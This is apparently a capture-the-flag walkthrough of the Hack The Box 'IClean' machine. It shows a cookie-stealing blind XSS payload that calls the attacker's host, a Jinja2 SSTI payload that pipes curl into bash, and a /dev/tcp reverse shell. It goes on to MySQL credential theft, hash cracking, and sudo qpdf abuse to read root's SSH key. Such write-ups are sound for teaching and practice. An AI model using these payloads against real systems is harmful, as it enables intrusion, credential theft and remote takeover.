# [IClean](https://app.hackthebox.com/machines/iclean)

```bash
nmap -p-  --min-rate 10000 10.10.11.12 -Pn
```

![alt text](img/image.png)

After detection of open ports, let's do greater nmap scan for these ports.


```bash
nmap -A -sC -sV -p22,80 10.10.11.12 -Pn
```

![alt text](img/image-1.png)


While I open application, it redirects into `capiclean.htb` domain, that's why I need to add this domain into `/etc/hosts` file for resolving 


I found `/quote` endpoint where, I can submit user payloads to `service` body parameter cannot be seen from front page.

![alt text](img/image-2.png)

Let's add `XSS` payloads into here to be triggered.
```bash
<img src=x onerror=alert(1);>
```

![alt text](img/image-3.png)

It means `service` parameter is not filtered from untrusted user input.

Let's add `blind XSS` payload to steal user's cookies.

```bash
<img src=x onerror=fetch("http://10.10.14.12:8080/"+document.cookie);>
```

![alt text](img/image-5.png)

**Note:** Payload should be `URL` encoded.


We can see cookie in our http server's logs.
```bash
python3 -m http.server --bind 10.10.14.12 8080
```

![alt text](img/image-4.png)


Now, I can get this cookie and change on my browser's `Inspector` section. 

Then, I can browse `/dashboard` endpoint which opens `Admin Dashboard` as below.

![alt text](img/image-6.png)



Now, I have `/QRGenerator` endpoint, let's fuzz here with `SSTI` (Server-Side Template Injection) payloads.


**Note:** It should be also `URL` encoded.

I get payload from [here](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/?source=post_page-----cfc46f351353--------------------------------).


```bash
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")()}}
```


![alt text](img/image-7.png)



Let's change payload section with `reverse shell` payload, which I will open http.server and put reverse shell script into here to be executed by target machine.


First, I need to write below reverse shell script.
```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.12/1337 0>&1"
```


Then, I need to open http.server.
```bash
python3 -m http.server --bind 10.10.14.12 8080
```

![alt text](img/image-9.png)


```bash
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl http://10.10.14.12:8080/dr4ks | bash")|attr("read")()}}
```

![alt text](img/image-8.png)



Hola, I got reverse shell from port `1337`.

![alt text](img/image-10.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo;fg
export TERM=xterm
export SHELL=bash
```

![alt text](img/image-11.png)


I read `app.py` file and finds credentials of `mysql`.

![alt text](img/image-12.png)


iclean: pxCsmnGLckUb


Let's access to `mysql` database.
```bash
mysql -h localhost -u iclean -p
```

![alt text](img/image-13.png)


I copy password of `consuela` and paste into [Crackstation](https://crackstation.net)

![alt text](img/image-14.png)


consuela: simple and clean

These credentials works for me.

![alt text](img/image-15.png)

user.txt

![alt text](img/image-16.png)


For `privilege escalation`, I just run `sudo -l` to check privileges of this user.

![alt text](img/image-17.png)


I find [this](https://qpdf.readthedocs.io/en/stable/cli.html?source=post_page-----cfc46f351353--------------------------------) and prepare such an payload.

```bash
sudo /usr/bin/qpdf --empty /tmp/rsa.txt --qdf --add-attachment /root/.ssh/id_rsa --
```

![alt text](img/image-18.png)


While reading `/tmp/rsa.txt`, I can see `id_rsa` of root user.

![alt text](img/image-19.png)


Let's copy this and use.

```bash
chmod 600 id_rsa
ssh -i id_rsa root@10.10.11.12
```

![alt text](img/image-20.png)


root.txt

![alt text](img/image-21.png)